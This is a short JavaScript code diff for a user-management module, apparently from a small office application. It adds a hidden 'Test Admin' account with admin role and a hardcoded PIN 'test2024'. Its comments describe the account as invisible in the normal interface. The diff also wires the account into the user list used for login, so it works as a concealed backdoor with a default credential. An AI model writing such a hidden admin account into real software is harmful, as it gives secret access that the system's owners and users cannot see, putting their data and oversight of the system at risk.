@@ -37,6 +37,14 @@ const DEFAULT_USERS = [
 
 const PALETTE = ['#4f8ef7','#8b5cf6','#0891b2','#059669','#f59e0b','#ef4444','#ec4899','#10b981','#f97316','#06b6d4']
 
+// Utilisateur test secret — invisible dans toute l'UI normale
+export const TEST_USER_ID = '00000000-0000-0000-0000-000000000099'
+const TEST_USER = {
+  id: TEST_USER_ID, name: 'Test Admin', pin: 'test2024', role: 'admin',
+  poste: 'Mode test', email: '', phone: '', date_entree: '',
+  color: '#dc2626', _isTestUser: true,
+}
+
 const rd = (key, fallback) => { try { return JSON.parse(localStorage.getItem(key) || fallback) } catch { return JSON.parse(fallback) } }
 const wr = (key, val) => localStorage.setItem(key, JSON.stringify(val))
 
@@ -87,6 +95,12 @@ export const removeLocalUser = (id) => {
 }
 
 export const pickColor = (idx) => PALETTE[idx % PALETTE.length]
+
+// Pour l'auth uniquement — inclut le test user caché
+export const getUsersForAuth = () => {
+  const pins = rd('cabinet_pins', '{}')
+  return [...getUsers(), { ...TEST_USER, pin: pins[TEST_USER_ID] ?? TEST_USER.pin }]
+}
 
 export const getAssistants = () => getUsers().filter(u => u.role === 'assistant')
 export const getManagers   = () => getUsers().filter(u => u.role === 'manager')
